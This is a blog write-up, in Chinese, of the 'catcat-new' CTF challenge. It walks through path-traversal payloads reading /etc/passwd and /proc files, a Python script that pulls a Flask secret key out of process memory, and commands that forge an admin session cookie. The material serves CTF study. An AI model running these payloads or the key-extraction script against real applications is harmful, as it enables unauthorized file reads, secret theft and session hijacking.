<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>攻防世界-catcat-new | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>攻防世界-catcat-new</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-08-16T10:51:45.473Z" id="date"> 2023-08-16</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-08-17T03:10:37.560Z" id="updated"> 2023-08-17</time></div></span><br><span>Word Count: <div class="control">2.2k</div></span><br><span>Read Time: <div class="control">9 min</div></span></div></div><hr><div id="post-content"><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2>
<p>catcat</p>
<h2 id="题目解题："><a href="#题目解题：" class="headerlink" title="题目解题："></a>题目解题：</h2>
<p class='item-img' data-src='image-20230816190420575.png'><img src="image-20230816190420575.png" alt="image-20230816190420575"></p>
<p>进入首页随便点击一个图片，看到url如图，猜测就是文件包含了，测试了半天没啥头绪，还是看wp吧。。。</p>
<p>看了之后发现这是不会的点，那我们认真学习一番</p>
<p>文章说：一道有关任意文件读取，Linux敏感文件，flask-session伪造的题目</p>
<p>先看基础知识</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1./etc/passwd<br><br>该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符）<br><br>2./proc/self<br><br>proc是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中的数据。通过/proc/PID可以访问对应PID的进程内核数据，而/proc/self访问的是当前进程的内核数据。<br><br>3./proc/self/cmdline<br><br>该文件包含的内容为当前进程执行的命令行参数。<br><br>4./proc/self/mem<br><br>/proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。<br><br>5./proc/self/maps<br><br>/proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。<br><br>6.flask-session结构<br><br> flask_session是flask框架实现session功能的一个插件。其session结构分为三部分：序列化内容+时间+防篡改值，这三部分内容加密后以符号 “.”来进行分隔。flask_session默认session的储存是在用户Cookie中。但也可以指定存储在数据库，缓存中间件，服务器本地文件等等之中。<br></code></pre></td></tr></table></figure>
<p>输入该payload：<code>?file=../../../etc/passwd</code>，确实存在漏洞</p>
<p class='item-img' data-src='image-20230816190808892.png'><img src="image-20230816190808892.png" alt="image-20230816190808892"></p>
<p>读取当前进程的命令行参数。<code>?file=../../../../proc/self/cmdline</code>，发现有一个通过python启动app.py的命令。 所以可以得出该网站使用Python框架，并且因为有app.py可知使用的是flask框架。</p>
<p class='item-img' data-src='image-20230816191102417.png'><img src="image-20230816191102417.png" alt="image-20230816191102417"></p>
<p>尝试读取app.py文件。</p>
<p class='item-img' data-src='image-20230816191129077.png'><img src="image-20230816191129077.png" alt="image-20230816191129077"></p>
<p>复制文本内容，将字符串f-string格式化输出美化一下。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, Markup<br><span class="hljs-keyword">from</span> cat <span class="hljs-keyword">import</span> cat<br> <br>flag = <span class="hljs-string">&quot;&quot;</span><br>app = Flask( <span class="hljs-comment">#这部分代码导入了所需的模块，其中包括Flask、os、uuid等。创建了一个Flask应用实例，并设置了静态资源路径。</span><br>    __name__,<br>    static_url_path=<span class="hljs-string">&#x27;/&#x27;</span>,<br>    static_folder=<span class="hljs-string">&#x27;static&#x27;</span><br>)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>) + <span class="hljs-string">&quot;*abcdefgh&quot;</span>  <span class="hljs-comment"># 此处利用uuid.uuid4()生成了一串id字符串并在后面拼接*abcdefgh</span><br><span class="hljs-keyword">if</span> os.path.isfile(<span class="hljs-string">&quot;/flag&quot;</span>):  <span class="hljs-comment"># 导入flag文件并删除掉，cat函数作用是读取flag内容，赋值给flag变量</span><br>    flag = cat(<span class="hljs-string">&quot;/flag&quot;</span>)<br>    os.remove(<span class="hljs-string">&quot;/flag&quot;</span>)<br> <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)  </span><span class="hljs-comment"># / 路径的处理函数用于渲染首页模板，展示可用的&quot;cat&quot;列表。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    detailtxt = os.listdir(<span class="hljs-string">&#x27;./details/&#x27;</span>)<br>    cats_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> detailtxt:<br>        cats_list.append(i[:i.index(<span class="hljs-string">&#x27;.&#x27;</span>)])<br> <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, cats_list=cats_list, cat=cat)<br> <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/info&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-comment"># </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(): <span class="hljs-comment"># /info 路径的处理函数接收GET或POST请求，从&quot;./details/&quot;目录下读取文件内容，并在详情页展示。</span><br>    filename = <span class="hljs-string">&quot;./details/&quot;</span> + request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    start = request.args.get(<span class="hljs-string">&#x27;start&#x27;</span>, <span class="hljs-string">&quot;0&quot;</span>)<br>    end = request.args.get(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-string">&quot;0&quot;</span>)<br>    name = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>)[:request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>).index(<span class="hljs-string">&#x27;.&#x27;</span>)]<br> <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end))<br> <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)  </span><span class="hljs-comment"># 在session信息中admin=1的用户在/admin路径下访问网站可以获得flag，所以要伪造session。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_can_list_root</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> flag<br>    <span class="hljs-keyword">else</span>:<br>        session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NoNoNo&quot;</span><br> <br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">5637</span>)<br></code></pre></td></tr></table></figure>
<p>以上就是app.py的代码</p>
<p>flask_session的伪造需要用到secret_key，而secret_key的值可以通过内存数据获取。先读取/proc/self/maps文件获取可读内容的内存映射地址。</p>
<p class='item-img' data-src='image-20230816224523346.png'><img src="image-20230816224523346.png" alt="image-20230816224523346"></p>
<p>执行破解脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># ----------------------------------</span><br><span class="hljs-comment">###################################</span><br><span class="hljs-comment"># Edited by lx56@blog.lxscloud.top</span><br><span class="hljs-comment">###################################</span><br><span class="hljs-comment"># ----------------------------------</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> ast, sys<br><span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABC<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br> <br>url = <span class="hljs-string">&quot;http://61.147.171.105:62610/&quot;</span><br> <br><span class="hljs-comment"># 此程序只能运行于Python3以上</span><br><span class="hljs-keyword">if</span> sys.version_info[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">3</span>:  <span class="hljs-comment"># &lt; 3.0</span><br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Must be using at least Python 3&#x27;</span>)<br> <br> <br><span class="hljs-comment"># ----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ----------------</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockApp</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, secret_key</span>):<br>        self.secret_key = secret_key     <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FSCM</span>(<span class="hljs-title class_ inherited__">ABC</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):<br>        <span class="hljs-comment"># Encode a Flask session cookie</span><br>        <span class="hljs-keyword">try</span>:<br>            app = MockApp(secret_key)<br>            session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))<br>            si = SecureCookieSessionInterface()<br>            s = si.get_signing_serializer(app)<br>            <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>            <span class="hljs-keyword">raise</span> e<br><span class="hljs-comment"># 由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key</span><br>s_key = <span class="hljs-string">&quot;&quot;</span><br>bypass = <span class="hljs-string">&quot;../..&quot;</span><br><span class="hljs-comment"># 请求file路由进行读取</span><br>map_list = requests.get(url + <span class="hljs-string">f&quot;info?file=<span class="hljs-subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)<span class="hljs-comment"># 读取当前进程内容</span><br>map_list = map_list.text.split(<span class="hljs-string">&quot;\\n&quot;</span>) <span class="hljs-comment"># 以换行符分开内容</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> map_list:<br>    <span class="hljs-comment"># 匹配指定格式的地址</span><br>    map_addr = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)<br>    <span class="hljs-keyword">if</span> map_addr:<br>        start = <span class="hljs-built_in">int</span>(map_addr.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>)<br>        end = <span class="hljs-built_in">int</span>(map_addr.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found rw addr:&quot;</span>, start, <span class="hljs-string">&quot;-&quot;</span>, end)<br>        <span class="hljs-comment"># 设置起始和结束位置并读取/proc/self/mem</span><br>        res = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/info?file=<span class="hljs-subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="hljs-subst">&#123;start&#125;</span>&amp;end=<span class="hljs-subst">&#123;end&#125;</span>&quot;</span>)<br>        <span class="hljs-comment"># 用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*abcdefgh&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            <span class="hljs-comment"># 正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh</span><br>            secret_key = re.findall(<span class="hljs-string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)<br>            <span class="hljs-keyword">if</span> secret_key:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Secret Key:&quot;</span>, secret_key[<span class="hljs-number">0</span>])<br>                s_key = secret_key[<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230816224848440.png'><img src="image-20230816224848440.png" alt="image-20230816224848440"></p>
<p>有了secret_key后接下来就是伪造session，session在访问/admin路径时的cookie中。session为eyJhZG1pbiI6MH0.ZNzhIg.Z7MhkPlaNm3hajdIBv_AEL995xo</p>
<p class='item-img' data-src='image-20230816225454692.png'><img src="image-20230816225454692.png" alt="image-20230816225454692"></p>
<p>使用工具flask_session_cookie_manager伪造session。使用方法为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">解密 python flask_session_cookie_manager3.py decode -s “secret_key” -c “session”<br>加密 python flask_session_cookie_manager3.py encode -s “secret_key” -t “data”<br></code></pre></td></tr></table></figure>
<p>执行如下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python flask_session_cookie_manager3.py decode -s &quot;bd07849f5c4e4359843eb39758e389f0*abcdefgh&quot; -c &quot;eyJhZG1pbiI6MH0.ZNznXw.gl2UUGVxRJ7z7FgWD-jlsS_ETPE&quot;<br><br>python flask_session_cookie_manager3.py encode -s &quot;bd07849f5c4e4359843eb39758e389f0*abcdefgh&quot; -t &quot;&#123;&#x27;admin&#x27;: 1&#125;&quot;<br><br>python flask_session_cookie_manager3.py encode -s “bd07849f5c4e4359843eb39758e389f0*abcdefgh” -t “&#123;&#x27;admin&#x27;: 1&#125;”<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230816231225769.png'><img src="image-20230816231225769.png" alt="image-20230816231225769"></p>
<p class='item-img' data-src='image-20230816230351504.png'><img src="image-20230816230351504.png" alt="image-20230816230351504"></p>
<p>得到伪造的session，使用burpsuite更改session并执行，得到flag。</p>
<p class='item-img' data-src='image-20230816232503608.png'><img src="image-20230816232503608.png" alt="image-20230816232503608"></p>
<p>这里不知为何，我认为我步骤一样的，但是复现不出来，最后找了一个一把梭的脚本，依旧是nonono，因而不纠结了，知道思路即可</p>
<p>上述脚本也是只能看懂，根本不会写。。。。只希望未来不在是脚本小子了</p>
<h2 id="知识总结："><a href="#知识总结：" class="headerlink" title="知识总结："></a>知识总结：</h2>
<h3 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask-session伪造"></a>flask_session伪造</h3>
<h4 id="伪造原理"><a href="#伪造原理" class="headerlink" title="伪造原理"></a>伪造原理</h4>
<p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p>
<p>通常情况下会和SSTI知识点同步考察。</p>
<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4>
<p>我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的<code>SECRET_KEY</code></p>
<p>加解密脚本自取：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python2 脚本2.py decode -c &quot;session值&quot; -s &quot;key值&quot;<br>python2 脚本2.py encode -s &quot;key值&quot; -t &quot;我们需要伪造的值&quot;<br>python3 脚本3.py decode -c &quot;session值&quot; -s &quot;key值&quot;<br>python3 脚本3.py encode -s &quot;key值&quot; -t &quot;我们需要伪造的值&quot;<br></code></pre></td></tr></table></figure>
<p>所需要注意的地方就是python的版本不同所对应的脚本也不相同。</p>
<h4 id="Flask的session格式"><a href="#Flask的session格式" class="headerlink" title="Flask的session格式"></a>Flask的session格式</h4>
<p class='item-img' data-src='image-20230817110744718.png'><img src="image-20230817110744718.png" alt="image-20230817110744718"></p>
<p>base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名</p>
<p><em><strong>时间戳</strong></em>用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；<em><strong>签名</strong></em>是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>secret_key</code>加密而成的，用来保证数据没有被修改。</p>
<p>由上文所述的session格式可知，要修改并伪造一个session的必要条件就是知道加密所采用的<code>secret_key</code>，一旦获取到<code>secret_key</code>, 我们就可以轻松的构造签名，从而实现客户端的session的伪造。</p>
<h2 id="文章参考："><a href="#文章参考：" class="headerlink" title="文章参考："></a>文章参考：</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_63138919/article/details/132082673?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169218363016800192245637%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=169218363016800192245637&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-14-132082673-null-null.142%5Ev92%5EchatgptT0_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccatcat-new&amp;spm=1018.2226.3001.4187">参考一</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45723896/article/details/131399810?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169218363016800192245637%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=169218363016800192245637&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-11-131399810-null-null.142%5Ev92%5EchatgptT0_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccatcat-new&amp;spm=1018.2226.3001.4187">参考二</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/niyani/p/17074125.html">参考三</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/08/17/lottery/">← Next 攻防世界-lottery</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/08/16/warmup/">攻防世界-warmup Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">题目描述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">题目解题：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">知识总结：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask-session%E4%BC%AA%E9%80%A0"><span class="toc-number">3.1.</span> <span class="toc-text">flask_session伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.1.</span> <span class="toc-text">伪造原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.1.2.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.3.</span> <span class="toc-text">使用方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flask%E7%9A%84session%E6%A0%BC%E5%BC%8F"><span class="toc-number">3.1.4.</span> <span class="toc-text">Flask的session格式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E7%AB%A0%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">文章参考：</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>